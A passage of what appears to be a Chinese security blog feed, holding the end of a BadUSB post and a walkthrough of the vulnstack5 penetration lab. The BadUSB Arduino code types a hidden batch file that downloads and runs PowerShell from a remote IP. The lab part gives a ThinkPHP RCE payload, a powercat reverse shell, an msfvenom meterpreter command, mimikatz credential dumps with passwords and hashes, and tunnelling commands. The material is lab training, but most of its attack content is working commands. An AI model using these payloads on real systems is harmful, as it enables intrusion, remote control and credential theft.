MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;SET/P=MSHTA VBSCRIPT:CREATEOBJECT(\&quot;WSCRIPT.SHELL\&quot;).RUN(\&quot;%~NX0 H\&quot;,0)(WINDOW.CLOSE)&gt;&gt; MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;S&quot;</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;ECHO. &gt;&gt; MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_E);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_C);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_H);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_O);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_SPACE);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_E);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_X);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_I);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_T);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;&gt;&gt; MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;ECHO :BEGIN &gt;&gt; MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;ECHO CMD /K \&quot;ECHO iNVOKE-eXPRESSION(NEW-OBJECT NET.WEBCLIENT).DOWNLOADSTRING(&#x27;HTTP://43.139.114.127:1235/A&#x27;) | POWERSHELL -\&quot; &gt;&gt; MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">57</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个代码相较Bypass 火绒的来说长了不少，这是因为我遇到了一个难以解决的问题。那就是我似乎不能直接写出下面这行代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DigiKeyboard.println(&quot;MODE CON: cols=16 lines=1 &amp;&amp; color fe&quot;);</span><br></pre></td></tr></table></figure><p>当我的代码中有这一行的时候无法烧录成功（但是我在上面绕过火绒部分写的Arduino代码却可以直接写这一行代码）。因此我找到了DigiKeyboard.h的按键对照表：<a href="https://bobmckay.com/wp-content/uploads/2022/07/Hut1_12v2.pdf">https://bobmckay.com/wp-content/uploads/2022/07/Hut1_12v2.pdf</a>。在文件的第53页开始，写了每个按键相对应的数字，利用sendKeyStroke方法调用。</p><p>代码虽然长，但是实际在命令行中输入的代码也并未增多。</p><p>以下是演示效果：</p><p><a href="https://watch.wave.video/MnKvDgds25bwtIoc">https://watch.wave.video/MnKvDgds25bwtIoc</a></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>在原理分析中提到，恶意代码写入在设备初始化固件中，而不是通过autorun.inf等媒体自动播放文件进行控制，因此无法通过禁用媒体自动播放进行防御，并且这部分区域是杀毒软件无法访问的区域， 所以杀毒软件更是无法检测设备固件中的恶意代码。</p><p>因为无法阻止电脑识别键盘、鼠标或U盘此类HID设备，所以目前仍然没有什么有效的技术手段去防御BadUSB。尽管360安全卫士已经开发出所谓的防御BadUSB的功能——“变形虫防护”了，但在我在本地尝试这个功能时仍然可以get shell。</p><p>因此面对这种攻击，我们只能提高自身的安全意识，不因为好奇心而去乱插可疑的U盘。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>个人认为只有拥有基础的安全知识，那么BadUSB的制作还是比较简单的，对于我而言最复杂的可能就是编写Arduino代码那部分了。同时也是第一次使用DigiKeyboard.h库，因此查阅了不少资料。不过这次制作完成之后，也算入了Arduino的门了，希望以后可以用Arduino写出一些好玩的东西吧。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透——vulnstack5</title>
      <link href="/2022/11/08/vulnstack5/"/>
      <url>/2022/11/08/vulnstack5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>靶场下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/7/">http://vulnstack.qiyuanxuetang.net/vuln/detail/7/</a></p><h2 id="环境部署："><a href="#环境部署：" class="headerlink" title="环境部署："></a>环境部署：</h2><h3 id="Win7"><a href="#Win7" class="headerlink" title="Win7"></a>Win7</h3><p>Win7做Web服务器，有两条网卡，分别连通内外网：</p><p><a href="https://pic.imgdb.cn/item/65752474c458853aef4009ea.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752474c458853aef4009ea.jpg"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">内网IP：192.168.138.136</span><br><span class="line">外网IP：192.168.135.150</span><br><span class="line">注意手动打开phpstudy</span><br></pre></td></tr></table></figure><h3 id="Windows-2008"><a href="#Windows-2008" class="headerlink" title="Windows 2008"></a>Windows 2008</h3><p>Windows 2008只有一个网卡连接，处于内网无法与外网通信：</p><p><a href="https://pic.imgdb.cn/item/65752484c458853aef403e3e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752484c458853aef403e3e.jpg"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内网IP：192.168.138.138</span><br></pre></td></tr></table></figure><h3 id="攻击机："><a href="#攻击机：" class="headerlink" title="攻击机："></a>攻击机：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">外网IP：192.168.135.128</span><br></pre></td></tr></table></figure><p>VMnet2网卡设置如下：</p><p><a href="https://pic.imgdb.cn/item/65752494c458853aef407636.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752494c458853aef407636.jpg"></a></p><h2 id="外网渗透："><a href="#外网渗透：" class="headerlink" title="外网渗透："></a>外网渗透：</h2><p><a href="https://pic.imgdb.cn/item/6575249fc458853aef409a39.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575249fc458853aef409a39.jpg"></a></p><p>进入网页后，可以发现部署的是5.0版本的ThinkPHP，去网上搜一搜能发现不少payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><p>利用网上的payload打一下：</p><p><a href="https://pic.imgdb.cn/item/657524abc458853aef40c2d9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657524abc458853aef40c2d9.jpg"></a></p><p>RCE成功。接下来利用powercat反弹一下shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=powershell.exe IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.135.128:1235/powercat.ps1&#x27;);powercat -c 192.168.135.128 -p 1234 -e cmd.exe</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/657524bbc458853aef41018c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657524bbc458853aef41018c.jpg"></a></p><p><a href="https://pic.imgdb.cn/item/657524c8c458853aef412cdc.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657524c8c458853aef412cdc.jpg"></a></p><p>反弹成功。</p><p>接下来利用metasploit制作一个exe，在靶机中下载下来然后执行，把meterpreter反弹出来:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.135.128 LPORT=1236 -f exe -o shell.exe</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/657524d9c458853aef416d3b.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657524d9c458853aef416d3b.jpg"></a></p><p>接下来msf监听，在拿到的shell中执行下载的木马文件，拿到meterpreter：</p><p><a href="https://pic.imgdb.cn/item/657524e7c458853aef419ea3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657524e7c458853aef419ea3.jpg"></a></p><h2 id="内网信息收集："><a href="#内网信息收集：" class="headerlink" title="内网信息收集："></a>内网信息收集：</h2><p>在meterpreter执行getsystem即可拿到system权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">net view                 # 查看局域网内其他主机名</span><br><span class="line">net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class="line">net user                 # 查看本机用户列表</span><br><span class="line">net user /domain         # 查看域用户</span><br><span class="line">net localgroup administrators # 查看本地管理员组（通常会有域用户）</span><br><span class="line">net view /domain         # 查看有几个域</span><br><span class="line">net user 用户名 /domain   # 获取指定域用户的信息</span><br><span class="line">net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br><span class="line">net time /domain    #判断主域，主域服务器一般做时间服务器</span><br><span class="line">net group 组名 /domain    # 查看域中某工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain  # 查看域管理员的名字</span><br><span class="line">net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名</span><br><span class="line">net group &quot;domain controllers&quot; /domain  # 查看域控制器主机名（可能有多台）</span><br><span class="line">ipconfig /all #查询本机IP段，所在域等</span><br></pre></td></tr></table></figure><p>执行ipconfig &#x2F;all可以发现Web服务器的内网IP为192.168.138.136，并且DNS server为192.168.138.138：</p><p><a href="https://pic.imgdb.cn/item/657524f6c458853aef41d0d5.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657524f6c458853aef41d0d5.jpg"></a></p><p>IP为192.168.138.138的这台机器应该就是DC了。根据ipconfig &#x2F;all返回的内容也可以得知当前所在域为sun.com。可以判断出我们最开始拿到的shell的用户就是域管：</p><p><a href="https://pic.imgdb.cn/item/65752502c458853aef41f353.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752502c458853aef41f353.jpg"></a></p><p>域中的用户如下：</p><p><a href="https://pic.imgdb.cn/item/6575250dc458853aef422191.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575250dc458853aef422191.jpg"></a></p><p>内网主机如下所示：</p><p><a href="https://pic.imgdb.cn/item/65752519c458853aef424918.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752519c458853aef424918.jpg"></a></p><p>查看有多少域：</p><p><a href="https://pic.imgdb.cn/item/65752524c458853aef426feb.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752524c458853aef426feb.jpg"></a></p><p>由于msf的mimikatz一直不好用，我们自己上传一个，然后拿一下密码：</p><p><a href="https://pic.imgdb.cn/item/6575252fc458853aef429997.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575252fc458853aef429997.jpg"></a></p><p><a href="https://pic.imgdb.cn/item/6575253ac458853aef42bf12.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575253ac458853aef42bf12.jpg"></a></p><p>拿一下系统密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug#权限提升</span><br><span class="line">sekurlsa::logonPasswords#明文抓取</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::logonPasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 1372017 (00000000:0014ef71)</span><br><span class="line">Session           : CachedInteractive from 1</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : SUN</span><br><span class="line">Logon Server      : DC</span><br><span class="line">Logon Time        : 2022/11/8 13:10:01</span><br><span class="line">SID               : S-1-5-21-3388020223-1982701712-4030140183-500</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : SUN</span><br><span class="line"> * LM       : c8c42d085b5e3da2e9260223765451f1</span><br><span class="line"> * NTLM     : e8bea972b3549868cecd667a64a6ac46</span><br><span class="line"> * SHA1     : 3688af445e35efd8a4d4e0a9eb90b754a2f3a4ee</span><br><span class="line">tspkg :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : SUN</span><br><span class="line"> * Password : dc123.com</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : SUN</span><br><span class="line"> * Password : dc123.com</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : SUN.COM</span><br><span class="line"> * Password : dc123.com</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 578158 (00000000:0008d26e)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : leo</span><br><span class="line">Domain            : SUN</span><br><span class="line">Logon Server      : DC</span><br><span class="line">Logon Time        : 2022/11/8 13:06:13</span><br><span class="line">SID               : S-1-5-21-3388020223-1982701712-4030140183-1110</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : leo</span><br><span class="line"> * Domain   : SUN</span><br><span class="line"> * LM       : b73a13e9b7832a35aad3b435b51404ee</span><br><span class="line"> * NTLM     : afffeba176210fad4628f0524bfe1942</span><br><span class="line"> * SHA1     : fa83a92197d9896cb41463b7a917528b4009c650</span><br><span class="line">tspkg :</span><br><span class="line"> * Username : leo</span><br><span class="line"> * Domain   : SUN</span><br><span class="line"> * Password : 123.com</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : leo</span><br><span class="line"> * Domain   : SUN</span><br><span class="line"> * Password : 123.com</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : leo</span><br><span class="line"> * Domain   : SUN.COM</span><br><span class="line"> * Password : 123.com</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/11/8 13:06:01</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : WIN7$</span><br><span class="line">Domain            : SUN</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/11/8 13:06:01</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN7$</span><br><span class="line"> * Domain   : SUN</span><br><span class="line"> * NTLM     : dc1cbe1583c92a3740cfcd97e8f0a377</span><br><span class="line"> * SHA1     : 9275a3ad29e3f533b9a46b981dd635b6adc76169</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN7$</span><br><span class="line"> * Domain   : SUN</span><br><span class="line"> * Password : 5a 45 e6 d5 ca ea f3 f2 12 6e 93 4b b8 36 8b 96 02 92 92 af 89 53 f2 61 a4 cf df fb b1 fe d4 3e 15 4a 50 c1 1d 49 82 ad d2 b9 09 de bb c2 0a 73 93 73 63 92 e2 5e 43 df 49 db fa 4f 34 d4 cc 3d a7 4d eb 2e 9a 06 b7 b1 c8 f6 dd f2 62 46 b2 bd 40 a4 ca 49 90 1b 46 79 05 d2 9e 0b 22 35 03 84 c4 d9 02 8b 6a fc 28 21 5c 59 46 59 e7 4c ae 9f 67 ea 59 bd 16 f3 f8 d6 42 7f e8 41 66 92 08 39 d8 58 18 0f dc eb 7a 18 1b 9d ca 6b a1 97 05 b5 55 c1 40 82 3e 64 5a cc 1a 78 9a bc 7f 27 c8 f0 47 7f 9f bd f1 53 4b ab c7 2a e1 cc fa bc 51 62 e1 17 7a 74 32 39 cd 5b 99 c8 40 5c 84 93 b3 cb 7c 0e 0e 29 02 9c 46 ab f2 73 c2 4e 64 c3 58 b4 22 21 77 c1 71 e6 b8 aa b8 45 ae e6 a5 63 a4 9a 45 03 ab 3a 3d c1 36 a1 84 3c db a6 d3 ac 16 65 </span><br><span class="line">kerberos :</span><br><span class="line"> * Username : win7$</span><br><span class="line"> * Domain   : SUN.COM</span><br><span class="line"> * Password : 5a 45 e6 d5 ca ea f3 f2 12 6e 93 4b b8 36 8b 96 02 92 92 af 89 53 f2 61 a4 cf df fb b1 fe d4 3e 15 4a 50 c1 1d 49 82 ad d2 b9 09 de bb c2 0a 73 93 73 63 92 e2 5e 43 df 49 db fa 4f 34 d4 cc 3d a7 4d eb 2e 9a 06 b7 b1 c8 f6 dd f2 62 46 b2 bd 40 a4 ca 49 90 1b 46 79 05 d2 9e 0b 22 35 03 84 c4 d9 02 8b 6a fc 28 21 5c 59 46 59 e7 4c ae 9f 67 ea 59 bd 16 f3 f8 d6 42 7f e8 41 66 92 08 39 d8 58 18 0f dc eb 7a 18 1b 9d ca 6b a1 97 05 b5 55 c1 40 82 3e 64 5a cc 1a 78 9a bc 7f 27 c8 f0 47 7f 9f bd f1 53 4b ab c7 2a e1 cc fa bc 51 62 e1 17 7a 74 32 39 cd 5b 99 c8 40 5c 84 93 b3 cb 7c 0e 0e 29 02 9c 46 ab f2 73 c2 4e 64 c3 58 b4 22 21 77 c1 71 e6 b8 aa b8 45 ae e6 a5 63 a4 9a 45 03 ab 3a 3d c1 36 a1 84 3c db a6 d3 ac 16 65 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 50586 (00000000:0000c59a)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/11/8 13:06:01</span><br><span class="line">SID               : </span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN7$</span><br><span class="line"> * Domain   : SUN</span><br><span class="line"> * NTLM     : dc1cbe1583c92a3740cfcd97e8f0a377</span><br><span class="line"> * SHA1     : 9275a3ad29e3f533b9a46b981dd635b6adc76169</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line">kerberos :</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : WIN7$</span><br><span class="line">Domain            : SUN</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/11/8 13:06:01</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN7$</span><br><span class="line"> * Domain   : SUN</span><br><span class="line"> * Password : 5a 45 e6 d5 ca ea f3 f2 12 6e 93 4b b8 36 8b 96 02 92 92 af 89 53 f2 61 a4 cf df fb b1 fe d4 3e 15 4a 50 c1 1d 49 82 ad d2 b9 09 de bb c2 0a 73 93 73 63 92 e2 5e 43 df 49 db fa 4f 34 d4 cc 3d a7 4d eb 2e 9a 06 b7 b1 c8 f6 dd f2 62 46 b2 bd 40 a4 ca 49 90 1b 46 79 05 d2 9e 0b 22 35 03 84 c4 d9 02 8b 6a fc 28 21 5c 59 46 59 e7 4c ae 9f 67 ea 59 bd 16 f3 f8 d6 42 7f e8 41 66 92 08 39 d8 58 18 0f dc eb 7a 18 1b 9d ca 6b a1 97 05 b5 55 c1 40 82 3e 64 5a cc 1a 78 9a bc 7f 27 c8 f0 47 7f 9f bd f1 53 4b ab c7 2a e1 cc fa bc 51 62 e1 17 7a 74 32 39 cd 5b 99 c8 40 5c 84 93 b3 cb 7c 0e 0e 29 02 9c 46 ab f2 73 c2 4e 64 c3 58 b4 22 21 77 c1 71 e6 b8 aa b8 45 ae e6 a5 63 a4 9a 45 03 ab 3a 3d c1 36 a1 84 3c db a6 d3 ac 16 65 </span><br><span class="line">kerberos :</span><br><span class="line"> * Username : win7$</span><br><span class="line"> * Domain   : SUN.COM</span><br><span class="line"> * Password : 5a 45 e6 d5 ca ea f3 f2 12 6e 93 4b b8 36 8b 96 02 92 92 af 89 53 f2 61 a4 cf df fb b1 fe d4 3e 15 4a 50 c1 1d 49 82 ad d2 b9 09 de bb c2 0a 73 93 73 63 92 e2 5e 43 df 49 db fa 4f 34 d4 cc 3d a7 4d eb 2e 9a 06 b7 b1 c8 f6 dd f2 62 46 b2 bd 40 a4 ca 49 90 1b 46 79 05 d2 9e 0b 22 35 03 84 c4 d9 02 8b 6a fc 28 21 5c 59 46 59 e7 4c ae 9f 67 ea 59 bd 16 f3 f8 d6 42 7f e8 41 66 92 08 39 d8 58 18 0f dc eb 7a 18 1b 9d ca 6b a1 97 05 b5 55 c1 40 82 3e 64 5a cc 1a 78 9a bc 7f 27 c8 f0 47 7f 9f bd f1 53 4b ab c7 2a e1 cc fa bc 51 62 e1 17 7a 74 32 39 cd 5b 99 c8 40 5c 84 93 b3 cb 7c 0e 0e 29 02 9c 46 ab f2 73 c2 4e 64 c3 58 b4 22 21 77 c1 71 e6 b8 aa b8 45 ae e6 a5 63 a4 9a 45 03 ab 3a 3d c1 36 a1 84 3c db a6 d3 ac 16 65 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br></pre></td></tr></table></figure><p>域管的账号及密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">dc123.com</span><br></pre></td></tr></table></figure><p>域用户leo的账号及密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leo</span><br><span class="line">123.com</span><br></pre></td></tr></table></figure><h2 id="路由转发及隐藏通信隧道"><a href="#路由转发及隐藏通信隧道" class="headerlink" title="路由转发及隐藏通信隧道"></a>路由转发及隐藏通信隧道</h2><p><a href="https://pic.imgdb.cn/item/65752552c458853aef43082d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752552c458853aef43082d.jpg"></a></p><p>接下来尝试利用EarthWarm来搭建一个隐藏通信隧道，首先为Win7上传一个ew_for_Win.exe，接下来就可以搭建了：</p><p><a href="https://pic.imgdb.cn/item/65752561c458853aef433981.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752561c458853aef433981.jpg"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 1238 -e 1237(攻击机执行)</span><br><span class="line">ew_for_Win.exe -s rssocks -d 192.168.135.128 -e 1237(靶机执行)</span><br></pre></td></tr></table></figure><p>成功搭建：</p><p><a href="https://pic.imgdb.cn/item/6575256cc458853aef43659f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575256cc458853aef43659f.jpg"></a></p><p>我们修改proxychains4.conf添加如下代理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 1238</span><br></pre></td></tr></table></figure><p>同时不要忘记注释掉proxy_dns。</p><p>接下来利用proxychains4来通过添加的代理利用nmap扫描一下192.168.138.138这台机子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 